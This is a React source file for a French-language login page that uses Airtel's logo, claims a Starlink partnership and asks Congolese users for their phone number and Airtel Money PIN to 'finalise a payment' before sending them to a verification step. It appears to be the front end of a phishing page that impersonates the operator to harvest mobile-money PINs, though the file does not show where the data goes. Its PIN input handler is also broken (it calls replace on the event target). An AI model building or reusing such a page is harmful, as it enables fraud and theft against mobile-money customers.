import React, { useState } from 'react';
import { useLocation } from 'wouter';
import { Eye, EyeOff } from 'lucide-react';
import airtelLogo from '@assets/image_1784479304453.png';

export default function Login() {
  const [, setLocation] = useLocation();
  const [phoneNumber, setPhoneNumber] = useState('');
  const [pin, setPin] = useState('');
  const [showPin, setShowPin] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (phoneNumber && pin) {
      // Get state from window history if using wouter history state,
      // or we just pass phoneNumber forward
      setLocation('/verify', { state: { phoneNumber: `+243${phoneNumber}` } });
    }
  };

  return (
    <div className="min-h-[100dvh] flex flex-col bg-background font-sans">
      {/* Header */}
      <header className="py-8 flex flex-col items-center justify-center">
        <img src={airtelLogo} alt="Airtel Logo" className="h-12 w-auto object-contain mb-3" data-testid="img-logo-login" />
        <span className="text-xs font-bold text-muted-foreground uppercase tracking-wider" data-testid="text-partner-login">
          En collaboration avec STARLINK™
        </span>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center justify-center px-4 w-full max-w-md mx-auto -mt-12">
        <div className="w-full bg-card rounded-2xl shadow-sm border border-card-border p-6 md:p-8">
          <h1 className="text-xl font-bold text-center text-foreground mb-8" data-testid="text-login-title">
            Connectez-vous à Airtel Lite pour finaliser le paiement.
          </h1>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <label htmlFor="phone" className="text-sm font-semibold text-foreground">Numéro de téléphone</label>
              <div className="flex shadow-sm rounded-xl overflow-hidden border border-input focus-within:ring-2 focus-within:ring-primary focus-within:border-primary transition-all">
                <div className="bg-muted px-4 py-3 flex items-center justify-center border-r border-input gap-2 select-none">
                  <span className="text-lg leading-none" role="img" aria-label="Congo Flag">🇨🇩</span>
                  <span className="font-bold text-foreground">+243</span>
                </div>
                <input
                  id="phone"
                  type="tel"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, ''))}
                  placeholder="951234567"
                  className="flex-1 bg-transparent px-4 py-3 outline-none font-medium text-foreground w-full"
                  maxLength={9}
                  required
                  data-testid="input-phone"
                />
              </div>
            </div>

            <div className="space-y-2">
              <label htmlFor="pin" className="text-sm font-semibold text-foreground">Code PIN Airtel Money</label>
              <div className="relative">
                <input
                  id="pin"
                  type={showPin ? "text" : "password"}
                  value={pin}
                  onChange={(e) => setPin(e.target.replace(/\D/g, ''))}
                  placeholder="••••"
                  maxLength={4}
                  className="w-full rounded-xl border border-input bg-transparent px-4 py-3 outline-none font-medium text-foreground focus:ring-2 focus:ring-primary focus:border-primary transition-all tracking-widest placeholder:tracking-normal"
                  required
                  data-testid="input-pin"
                />
                <button
                  type="button"
                  onClick={() => setShowPin(!showPin)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground p-1 rounded-md transition-colors"
                  data-testid="button-toggle-pin"
                >
                  {showPin ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
            </div>

            <button
              type="submit"
              className="w-full bg-primary text-primary-foreground font-bold text-lg py-4 rounded-xl transition-transform active:scale-[0.98] hover:bg-primary/90 mt-4 shadow-md shadow-primary/20"
              disabled={!phoneNumber || !pin}
              data-testid="button-login-submit"
            >
              CONNEXION
            </button>
          </form>
        </div>
      </main>

      {/* Footer */}
      <footer className="py-8 text-center mt-auto">
        <p className="text-sm font-medium text-muted-foreground" data-testid="text-footer-copyright">
          © 2026 Airtel Congo. Tous droits réservés.
        </p>
      </footer>
    </div>
  );
}
